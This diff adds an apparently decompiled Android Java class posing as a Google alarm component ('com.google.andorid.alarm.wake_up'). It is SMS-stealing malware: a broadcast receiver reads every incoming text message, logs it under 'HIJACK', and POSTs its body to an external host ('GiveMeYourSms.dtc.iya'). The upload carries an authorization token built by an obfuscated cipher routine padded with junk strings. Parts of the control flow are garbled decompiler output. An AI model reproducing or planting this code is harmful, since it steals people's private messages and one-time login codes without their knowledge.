@@ -1,0 +1,197 @@
+```java
+package com.google.andorid.alarm;
+
+import android.annotation.TargetApi;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.telephony.SmsMessage;
+import android.util.Base64;
+import android.util.Log;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import javax.net.ssl.HttpsURLConnection;
+
+public class wake_up
+  extends BroadcastReceiver
+{
+  private final String a = "android.provider.Telephony.SMS_RECEIVED";
+  
+  static String a()
+  {
+    d();
+    return "TIFFEHNBMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU";
+  }
+  
+  static String b()
+  {
+    return "TIFFEHNBMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU";
+  }
+  
+  static String b(String paramString)
+  {
+    String str1 = "";
+    String str2 = d();
+    String str3 = paramString.toUpperCase();
+    int j = 0;
+    int i = 0;
+    paramString = str1;
+    if (i < str3.length())
+    {
+      int m = str3.charAt(i);
+      int k = j;
+      str1 = paramString;
+      if (m >= 65)
+      {
+        if (m <= 90) {
+          break label75;
+        }
+        str1 = paramString;
+      }
+      for (k = j;; k = (j + 1) % str2.length())
+      {
+        i += 1;
+        j = k;
+        paramString = str1;
+        break;
+        label75:
+        str1 = paramString + (char)((m - str2.charAt(j) + 26) % 26 + 65);
+      }
+    }
+    paramString = e() + paramString;
+    c();
+    return Base64.encodeToString(paramString.getBytes(), 0);
+  }
+  
+  static String c()
+  {
+    return "TIFFEHNBMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU";
+  }
+  
+  static String d()
+  {
+    return "ABBATHHTUUIZZIPQPQBEEB";
+  }
+  
+  static String e()
+  {
+    String str = Character.toString("TIFFFLEHNBAMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU".charAt(3));
+    str = str + Character.toString("TIFFFLEHNBAMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU".charAt(5));
+    str = str + Character.toString("TIFFFLEHNBAMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU".charAt(10));
+    return str + Character.toString("TIFFFLEHNBAMHLGSPTDAUGXWRUBSEUYHVEYBENZTDHYDERERPJDWPVKXHIENZTDHYDXLFNSJGAAZJOUZDAZPSZUU".charAt(14));
+  }
+  
+  @TargetApi(19)
+  public void a(String paramString)
+  {
+    String str = "msg=" + paramString;
+    b();
+    byte[] arrayOfByte = str.getBytes(StandardCharsets.UTF_8);
+    paramString = b(b());
+    Object localObject2 = (HttpsURLConnection)new URL("http://GiveMeYourSms.dtc.iya/").openConnection();
+    ((HttpsURLConnection)localObject2).setRequestMethod("POST");
+    ((HttpsURLConnection)localObject2).setRequestProperty("USER-AGENT", "Android");
+    ((HttpsURLConnection)localObject2).setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+    ((HttpsURLConnection)localObject2).setRequestProperty("charset", "utf-8");
+    ((HttpsURLConnection)localObject2).setRequestProperty("Content-Length", Integer.toString(str.length()));
+    ((HttpsURLConnection)localObject2).setRequestProperty("Authorization", paramString);
+    ((HttpsURLConnection)localObject2).setUseCaches(false);
+    a();
+    localObject2 = new DataOutputStream(((HttpsURLConnection)localObject2).getOutputStream());
+    paramString = null;
+    try
+    {
+      ((DataOutputStream)localObject2).write(arrayOfByte);
+      if ((localObject2 == null) || (0 != 0)) {}
+      for (;;)
+      {
+        try
+        {
+          ((DataOutputStream)localObject2).close();
+          e();
+          return;
+        }
+        catch (Throwable paramString)
+        {
+          throw new NullPointerException();
+        }
+        ((DataOutputStream)localObject2).close();
+      }
+      try
+      {
+        ((DataOutputStream)localObject2).close();
+        throw ((Throwable)localObject1);
+      }
+      catch (Throwable localThrowable2)
+      {
+        for (;;)
+        {
+          paramString.addSuppressed(localThrowable2);
+        }
+      }
+    }
+    catch (Throwable localThrowable1)
+    {
+      paramString = localThrowable1;
+      throw localThrowable1;
+    }
+    finally
+    {
+      if (localObject2 != null) {
+        if (paramString == null) {
+          break label198;
+        }
+      }
+    }
+    for (;;)
+    {
+      label198:
+      localThrowable2.close();
+    }
+  }
+  
+  public void onReceive(Context paramContext, Intent paramIntent)
+  {
+    int j = 0;
+    if ((paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) && (paramIntent.getExtras() != null))
+    {
+      paramIntent = (Object[])paramIntent.getSerializableExtra("pdus");
+      paramContext = new byte[paramIntent.length][];
+      int i = 0;
+      while (i < paramIntent.length)
+      {
+        paramContext[i] = ((byte[])(byte[])paramIntent[i]);
+        i += 1;
+      }
+      paramIntent = new byte[paramContext.length][];
+      int k = paramIntent.length;
+      SmsMessage[] arrayOfSmsMessage = new SmsMessage[k];
+      i = j;
+      for (;;)
+      {
+        if (i < k)
+        {
+          paramIntent[i] = paramContext[i];
+          arrayOfSmsMessage[i] = SmsMessage.createFromPdu(paramIntent[i]);
+          Log.i("HIJACK", arrayOfSmsMessage[i].getMessageBody());
+          String str = arrayOfSmsMessage[i].getMessageBody();
+          try
+          {
+            a(str);
+            i += 1;
+          }
+          catch (IOException localIOException)
+          {
+            for (;;)
+            {
+              localIOException.printStackTrace();
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
